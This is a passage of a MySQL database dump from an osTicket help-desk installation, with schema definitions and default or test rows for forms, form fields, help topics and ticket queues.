  `title` varchar(255) NOT NULL,
  `instructions` varchar(512) DEFAULT NULL,
  `name` varchar(64) NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_form`
--

LOCK TABLES `ost_form` WRITE;
/*!40000 ALTER TABLE `ost_form` DISABLE KEYS */;
INSERT INTO `ost_form` VALUES (1,NULL,'U',1,'Contact Information',NULL,'',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,NULL,'T',1,'Ticket Details','Please Describe Your Issue','','This form will be attached to every ticket, regardless of its source.\nYou can add any fields to this form and they will be available to all\ntickets, and will be searchable with advanced search and filterable.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,NULL,'C',1,'Company Information','Details available in email templates','',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,NULL,'O',1,'Organization Information','Details on user organization','',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(5,NULL,'A',1,'Task Details','Please Describe The Issue','','This form is used to create a task.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(6,NULL,'L1',0,'Ticket Status Properties','Properties that can be set on a ticket status.','',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_form` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_form_entry`
--

DROP TABLE IF EXISTS `ost_form_entry`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_form_entry` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `form_id` int(11) unsigned NOT NULL,
  `object_id` int(11) unsigned DEFAULT NULL,
  `object_type` char(1) NOT NULL DEFAULT 'T',
  `sort` int(11) unsigned NOT NULL DEFAULT 1,
  `extra` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `entry_lookup` (`object_type`,`object_id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_form_entry`
--

LOCK TABLES `ost_form_entry` WRITE;
/*!40000 ALTER TABLE `ost_form_entry` DISABLE KEYS */;
INSERT INTO `ost_form_entry` VALUES (1,4,1,'O',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,3,NULL,'C',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,1,1,'U',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,2,1,'T',0,'{\"disable\":[]}','2020-12-26 09:14:00','2020-12-26 09:14:00'),(5,1,2,'U',1,NULL,'2021-01-05 03:26:08','2021-01-05 03:26:08'),(6,2,2,'T',0,'{\"disable\":[]}','2021-01-05 03:26:24','2021-01-05 03:26:24'),(7,1,3,'U',1,NULL,'2021-01-05 06:06:28','2021-01-05 06:06:28'),(8,2,3,'T',0,'{\"disable\":[]}','2021-01-05 06:06:28','2021-01-05 06:06:28'),(9,1,4,'U',1,NULL,'2021-01-05 06:06:39','2021-01-05 06:06:39'),(10,2,4,'T',0,'{\"disable\":[]}','2021-01-05 06:06:39','2021-01-05 06:06:39'),(11,1,5,'U',1,NULL,'2021-01-05 06:06:45','2021-01-05 06:06:45'),(12,2,5,'T',0,'{\"disable\":[]}','2021-01-05 06:06:45','2021-01-05 06:06:45'),(13,1,6,'U',1,NULL,'2021-01-05 06:06:46','2021-01-05 06:06:46'),(14,2,6,'T',0,'{\"disable\":[]}','2021-01-05 06:06:46','2021-01-05 06:06:46'),(15,1,7,'U',1,NULL,'2021-01-30 16:33:45','2021-01-30 16:33:45'),(16,1,8,'U',1,NULL,'2021-01-30 16:40:20','2021-01-30 16:40:20'),(17,2,7,'T',0,'{\"disable\":[]}','2021-01-30 16:40:20','2021-01-30 16:40:20'),(18,1,9,'U',1,NULL,'2021-01-30 16:52:41','2021-01-30 16:52:41'),(19,2,8,'T',0,'{\"disable\":[]}','2021-01-30 16:52:41','2021-01-30 16:52:41'),(20,2,9,'T',0,'{\"disable\":[]}','2021-01-30 16:55:43','2021-01-30 16:55:43'),(21,1,10,'U',1,NULL,'2021-01-30 17:03:59','2021-01-30 17:03:59'),(22,2,10,'T',0,'{\"disable\":[]}','2021-01-30 17:03:59','2021-01-30 17:03:59'),(23,1,11,'U',1,NULL,'2021-01-30 17:09:01','2021-01-30 17:09:01'),(24,2,11,'T',0,'{\"disable\":[]}','2021-01-30 17:09:01','2021-01-30 17:09:01');
/*!40000 ALTER TABLE `ost_form_entry` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_form_entry_values`
--

DROP TABLE IF EXISTS `ost_form_entry_values`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_form_entry_values` (
  `entry_id` int(11) unsigned NOT NULL,
  `field_id` int(11) unsigned NOT NULL,
  `value` text DEFAULT NULL,
  `value_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`entry_id`,`field_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_form_entry_values`
--

LOCK TABLES `ost_form_entry_values` WRITE;
/*!40000 ALTER TABLE `ost_form_entry_values` DISABLE KEYS */;
INSERT INTO `ost_form_entry_values` VALUES (1,28,'1120 5th Street\nAlexandria, LA 71301',NULL),(1,29,'3182903674',NULL),(1,30,'https://osticket.com',NULL),(1,31,'Not only do we develop the software, we also use it to manage support for osTicket. Let us help you quickly implement and leverage the full potential of osTicket\'s features and functionality. Contact us for professional support or visit our website for documentation and community support.',NULL),(2,23,'delivery',NULL),(2,24,NULL,NULL),(2,25,NULL,NULL),(2,26,NULL,NULL),(3,3,NULL,NULL),(3,4,NULL,NULL),(4,20,'osTicket Installed!',NULL),(4,22,'Normal',2),(5,3,NULL,NULL),(5,4,NULL,NULL),(6,20,'noiss',NULL),(6,22,'Low',1),(7,3,NULL,NULL),(7,4,NULL,NULL),(8,20,'test',NULL),(8,22,'Low',1),(9,3,NULL,NULL),(9,4,NULL,NULL),(10,20,'test',NULL),(10,22,'Low',1),(11,3,NULL,NULL),(11,4,NULL,NULL),(12,20,'test',NULL),(12,22,'Low',1),(13,3,NULL,NULL),(13,4,NULL,NULL),(14,20,'test',NULL),(14,22,'Low',1),(15,3,NULL,NULL),(15,4,NULL,NULL),(16,3,NULL,NULL),(16,4,NULL,NULL),(17,20,'tretret',NULL),(17,22,'Low',1),(18,3,NULL,NULL),(18,4,NULL,NULL),(19,20,'shell',NULL),(19,22,'Low',1),(20,20,'hack',NULL),(20,22,'Low',1),(21,3,NULL,NULL),(21,4,NULL,NULL),(22,20,'dfgdfgdf',NULL),(22,22,'Low',1),(23,3,NULL,NULL),(23,4,NULL,NULL),(24,20,'adf',NULL),(24,22,'Low',1);
/*!40000 ALTER TABLE `ost_form_entry_values` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_form_field`
--

DROP TABLE IF EXISTS `ost_form_field`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_form_field` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `form_id` int(11) unsigned NOT NULL,
  `flags` int(10) unsigned DEFAULT 1,
  `type` varchar(255) NOT NULL DEFAULT 'text',
  `label` varchar(255) NOT NULL,
  `name` varchar(64) NOT NULL,
  `configuration` text DEFAULT NULL,
  `sort` int(11) unsigned NOT NULL,
  `hint` varchar(512) DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `form_id` (`form_id`),
  KEY `sort` (`sort`)
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_form_field`
--

LOCK TABLES `ost_form_field` WRITE;
/*!40000 ALTER TABLE `ost_form_field` DISABLE KEYS */;
INSERT INTO `ost_form_field` VALUES (1,1,489395,'text','Email Address','email','{\"size\":40,\"length\":64,\"validator\":\"email\"}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,1,489395,'text','Full Name','name','{\"size\":40,\"length\":64}',2,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,1,13057,'phone','Phone Number','phone',NULL,3,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,1,12289,'memo','Internal Notes','notes','{\"rows\":4,\"cols\":40}',4,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(20,2,489265,'text','Issue Summary','subject','{\"size\":40,\"length\":50}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(21,2,480547,'thread','Issue Details','message',NULL,2,'Details on the reason(s) for opening the ticket.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(22,2,274609,'priority','Priority Level','priority',NULL,3,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(23,3,291249,'text','Company Name','name','{\"size\":40,\"length\":64}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(24,3,274705,'text','Website','website','{\"size\":40,\"length\":64}',2,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(25,3,274705,'phone','Phone Number','phone','{\"ext\":false}',3,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(26,3,12545,'memo','Address','address','{\"rows\":2,\"cols\":40,\"html\":false,\"length\":100}',4,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(27,4,489395,'text','Name','name','{\"size\":40,\"length\":64}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(28,4,13057,'memo','Address','address','{\"rows\":2,\"cols\":40,\"length\":100,\"html\":false}',2,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(29,4,13057,'phone','Phone','phone',NULL,3,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(30,4,13057,'text','Website','website','{\"size\":40,\"length\":0}',4,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(31,4,12289,'memo','Internal Notes','notes','{\"rows\":4,\"cols\":40}',5,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(32,5,487601,'text','Title','title','{\"size\":40,\"length\":50}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(33,5,413939,'thread','Description','description',NULL,2,'Details on the reason(s) for creating the task.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(34,6,487665,'state','State','state','{\"prompt\":\"State of a ticket\"}',1,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(35,6,471073,'memo','Description','description','{\"rows\":\"2\",\"cols\":\"40\",\"html\":\"\",\"length\":\"100\"}',3,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_form_field` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_group`
--

DROP TABLE IF EXISTS `ost_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_group` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `role_id` int(11) unsigned NOT NULL,
  `flags` int(11) unsigned NOT NULL DEFAULT 1,
  `name` varchar(120) NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `role_id` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_group`
--

LOCK TABLES `ost_group` WRITE;
/*!40000 ALTER TABLE `ost_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_help_topic`
--

DROP TABLE IF EXISTS `ost_help_topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_help_topic` (
  `topic_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `topic_pid` int(10) unsigned NOT NULL DEFAULT 0,
  `ispublic` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `noautoresp` tinyint(3) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned DEFAULT 0,
  `status_id` int(10) unsigned NOT NULL DEFAULT 0,
  `priority_id` int(10) unsigned NOT NULL DEFAULT 0,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(10) unsigned NOT NULL DEFAULT 0,
  `team_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sla_id` int(10) unsigned NOT NULL DEFAULT 0,
  `page_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sequence_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sort` int(10) unsigned NOT NULL DEFAULT 0,
  `topic` varchar(32) NOT NULL DEFAULT '',
  `number_format` varchar(32) DEFAULT NULL,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`topic_id`),
  UNIQUE KEY `topic` (`topic`,`topic_pid`),
  KEY `topic_pid` (`topic_pid`),
  KEY `priority_id` (`priority_id`),
  KEY `dept_id` (`dept_id`),
  KEY `staff_id` (`staff_id`,`team_id`),
  KEY `sla_id` (`sla_id`),
  KEY `page_id` (`page_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_help_topic`
--

LOCK TABLES `ost_help_topic` WRITE;
/*!40000 ALTER TABLE `ost_help_topic` DISABLE KEYS */;
INSERT INTO `ost_help_topic` VALUES (1,0,1,0,0,0,2,0,0,0,0,0,0,2,'General Inquiry',NULL,'Questions about products or services','2020-12-26 09:14:00','2020-12-26 10:30:43'),(2,0,1,0,3,0,1,0,0,0,0,0,0,1,'Contact Us','#######','<p>Tickets that primarily concern the sales and billing departments</p>','2020-12-26 09:14:00','2020-12-26 10:31:23'),(10,0,1,0,0,0,2,3,0,0,0,0,0,3,'Report a Problem',NULL,'Product, service, or equipment related issues','2020-12-26 09:14:00','2020-12-26 10:30:43'),(11,10,1,0,0,0,3,0,0,0,1,0,0,4,'Access Issue',NULL,'Report an inability access a physical or virtual asset','2020-12-26 09:14:00','2020-12-26 10:30:43');
/*!40000 ALTER TABLE `ost_help_topic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_help_topic_form`
--

DROP TABLE IF EXISTS `ost_help_topic_form`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_help_topic_form` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `topic_id` int(11) unsigned NOT NULL DEFAULT 0,
  `form_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sort` int(10) unsigned NOT NULL DEFAULT 1,
  `extra` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `topic-form` (`topic_id`,`form_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_help_topic_form`
--

LOCK TABLES `ost_help_topic_form` WRITE;
/*!40000 ALTER TABLE `ost_help_topic_form` DISABLE KEYS */;
INSERT INTO `ost_help_topic_form` VALUES (1,1,2,1,'{\"disable\":[]}'),(2,2,2,1,'{\"disable\":[]}'),(3,10,2,1,'{\"disable\":[]}'),(4,11,2,1,'{\"disable\":[]}');
/*!40000 ALTER TABLE `ost_help_topic_form` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_list`
--

DROP TABLE IF EXISTS `ost_list`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_list` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `name_plural` varchar(255) DEFAULT NULL,
  `sort_mode` enum('Alpha','-Alpha','SortCol') NOT NULL DEFAULT 'Alpha',
  `masks` int(11) unsigned NOT NULL DEFAULT 0,
  `type` varchar(16) DEFAULT NULL,
  `configuration` text NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_list`
--

LOCK TABLES `ost_list` WRITE;
/*!40000 ALTER TABLE `ost_list` DISABLE KEYS */;
INSERT INTO `ost_list` VALUES (1,'Ticket Status','Ticket Statuses','SortCol',13,'ticket-status','{\"handler\":\"TicketStatusList\"}','Ticket statuses','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_list` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_list_items`
--

DROP TABLE IF EXISTS `ost_list_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_list_items` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `list_id` int(11) DEFAULT NULL,
  `status` int(11) unsigned NOT NULL DEFAULT 1,
  `value` varchar(255) NOT NULL,
  `extra` varchar(255) DEFAULT NULL,
  `sort` int(11) NOT NULL DEFAULT 1,
  `properties` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `list_item_lookup` (`list_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_list_items`
--

LOCK TABLES `ost_list_items` WRITE;
/*!40000 ALTER TABLE `ost_list_items` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_list_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_lock`
--

DROP TABLE IF EXISTS `ost_lock`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_lock` (
  `lock_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `staff_id` int(10) unsigned NOT NULL DEFAULT 0,
  `expire` datetime DEFAULT NULL,
  `code` varchar(20) DEFAULT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`lock_id`),
  KEY `staff_id` (`staff_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_lock`
--

LOCK TABLES `ost_lock` WRITE;
/*!40000 ALTER TABLE `ost_lock` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_lock` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_note`
--

DROP TABLE IF EXISTS `ost_note`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_note` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(11) unsigned DEFAULT NULL,
  `staff_id` int(11) unsigned NOT NULL DEFAULT 0,
  `ext_id` varchar(10) DEFAULT NULL,
  `body` text DEFAULT NULL,
  `status` int(11) unsigned NOT NULL DEFAULT 0,
  `sort` int(11) unsigned NOT NULL DEFAULT 0,
  `created` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `ext_id` (`ext_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_note`
--

LOCK TABLES `ost_note` WRITE;
/*!40000 ALTER TABLE `ost_note` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_note` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_organization`
--

DROP TABLE IF EXISTS `ost_organization`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_organization` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL DEFAULT '',
  `manager` varchar(16) NOT NULL DEFAULT '',
  `status` int(11) unsigned NOT NULL DEFAULT 0,
  `domain` varchar(256) NOT NULL DEFAULT '',
  `extra` text DEFAULT NULL,
  `created` timestamp NULL DEFAULT NULL,
  `updated` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_organization`
--

LOCK TABLES `ost_organization` WRITE;
/*!40000 ALTER TABLE `ost_organization` DISABLE KEYS */;
INSERT INTO `ost_organization` VALUES (1,'osTicket','',8,'',NULL,'2020-12-26 14:14:00',NULL);
/*!40000 ALTER TABLE `ost_organization` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_plugin`
--

DROP TABLE IF EXISTS `ost_plugin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_plugin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL,
  `install_path` varchar(60) NOT NULL,
  `isphar` tinyint(1) NOT NULL DEFAULT 0,
  `isactive` tinyint(1) NOT NULL DEFAULT 0,
  `version` varchar(64) DEFAULT NULL,
  `installed` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_plugin`
--

LOCK TABLES `ost_plugin` WRITE;
/*!40000 ALTER TABLE `ost_plugin` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_plugin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue`
--

DROP TABLE IF EXISTS `ost_queue`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(11) unsigned NOT NULL DEFAULT 0,
  `columns_id` int(11) unsigned DEFAULT NULL,
  `sort_id` int(11) unsigned DEFAULT NULL,
  `flags` int(11) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(11) unsigned NOT NULL DEFAULT 0,
  `sort` int(11) unsigned NOT NULL DEFAULT 0,
  `title` varchar(60) DEFAULT NULL,
  `config` text DEFAULT NULL,
  `filter` varchar(64) DEFAULT NULL,
  `root` varchar(32) DEFAULT NULL,
  `path` varchar(80) NOT NULL DEFAULT '/',
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `staff_id` (`staff_id`),
  KEY `parent_id` (`parent_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue`
--

LOCK TABLES `ost_queue` WRITE;
/*!40000 ALTER TABLE `ost_queue` DISABLE KEYS */;
INSERT INTO `ost_queue` VALUES (1,0,NULL,1,3,0,1,'Open','[[\"status__state\",\"includes\",{\"open\":\"Open\"}]]',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(2,1,NULL,4,43,0,1,'Open','{\"criteria\":[[\"isanswered\",\"nset\",null]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(3,1,NULL,4,43,0,2,'Answered','{\"criteria\":[[\"isanswered\",\"set\",null]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(4,1,NULL,4,43,0,3,'Overdue','{\"criteria\":[[\"isoverdue\",\"set\",null]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(5,0,NULL,3,3,0,3,'My Tickets','{\"criteria\":[[\"assignee\",\"includes\",{\"M\":\"Me\",\"T\":\"One of my teams\"}],[\"status__state\",\"includes\",{\"open\":\"Open\"}]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(6,5,NULL,NULL,43,0,1,'Assigned to Me','{\"criteria\":[[\"assignee\",\"includes\",{\"M\":\"Me\"}]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(7,5,NULL,NULL,43,0,2,'Assigned to Teams','{\"criteria\":[[\"assignee\",\"!includes\",{\"M\":\"Me\"}]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(8,0,NULL,5,3,0,4,'Closed','{\"criteria\":[[\"status__state\",\"includes\",{\"closed\":\"Closed\"}]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(9,8,NULL,5,43,0,1,'Today','{\"criteria\":[[\"closed\",\"period\",\"td\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(10,8,NULL,5,43,0,2,'Yesterday','{\"criteria\":[[\"closed\",\"period\",\"yd\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(11,8,NULL,5,43,0,3,'This Week','{\"criteria\":[[\"closed\",\"period\",\"tw\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(12,8,NULL,5,43,0,4,'This Month','{\"criteria\":[[\"closed\",\"period\",\"tm\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(13,8,NULL,6,43,0,5,'This Quarter','{\"criteria\":[[\"closed\",\"period\",\"tq\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00'),(14,8,NULL,7,43,0,6,'This Year','{\"criteria\":[[\"closed\",\"period\",\"ty\"]],\"conditions\":[]}',NULL,'T','/','2020-12-26 09:14:00','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `ost_queue` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_column`
--

DROP TABLE IF EXISTS `ost_queue_column`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_column` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `name` varchar(64) NOT NULL DEFAULT '',
  `primary` varchar(64) NOT NULL DEFAULT '',
  `secondary` varchar(64) DEFAULT NULL,
  `filter` varchar(32) DEFAULT NULL,
  `truncate` varchar(16) DEFAULT NULL,
  `annotations` text DEFAULT NULL,
  `conditions` text DEFAULT NULL,
  `extra` text DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_column`
--

LOCK TABLES `ost_queue_column` WRITE;
/*!40000 ALTER TABLE `ost_queue_column` DISABLE KEYS */;
INSERT INTO `ost_queue_column` VALUES (1,0,'Ticket #','number',NULL,'link:ticketP','wrap','[{\"c\":\"TicketSourceDecoration\",\"p\":\"b\"}]','[{\"crit\":[\"isanswered\",\"nset\",null],\"prop\":{\"font-weight\":\"bold\"}}]',NULL),(2,0,'Date Created','created',NULL,'date:full','wrap','[]','[]',NULL),(3,0,'Subject','cdata__subject',NULL,'link:ticket','ellipsis','[{\"c\":\"TicketThreadCount\",\"p\":\">\"},{\"c\":\"ThreadAttachmentCount\",\"p\":\"a\"},{\"c\":\"OverdueFlagDecoration\",\"p\":\"<\"},{\"c\":\"LockDecoration\",\"p\":\"<\"}]','[{\"crit\":[\"isanswered\",\"nset\",null],\"prop\":{\"font-weight\":\"bold\"}}]',NULL),(4,0,'User Name','user__name',NULL,NULL,'wrap','[{\"c\":\"ThreadCollaboratorCount\",\"p\":\">\"}]','[]',NULL),(5,0,'Priority','cdata__priority',NULL,NULL,'wrap','[]','[]',NULL),(6,0,'Status','status__id',NULL,NULL,'wrap','[]','[]',NULL),(7,0,'Close Date','closed',NULL,'date:full','wrap','[]','[]',NULL),(8,0,'Assignee','assignee',NULL,NULL,'wrap','[]','[]',NULL),(9,0,'Due Date','duedate','est_duedate','date:human','wrap','[]','[]',NULL),(10,0,'Last Updated','lastupdate',NULL,'date:full','wrap','[]','[]',NULL),(11,0,'Department','dept_id',NULL,NULL,'wrap','[]','[]',NULL),(12,0,'Last Message','thread__lastmessage',NULL,'date:human','wrap','[]','[]',NULL),(13,0,'Last Response','thread__lastresponse',NULL,'date:human','wrap','[]','[]',NULL),(14,0,'Team','team_id',NULL,NULL,'wrap','[]','[]',NULL);
/*!40000 ALTER TABLE `ost_queue_column` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_columns`
--

DROP TABLE IF EXISTS `ost_queue_columns`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
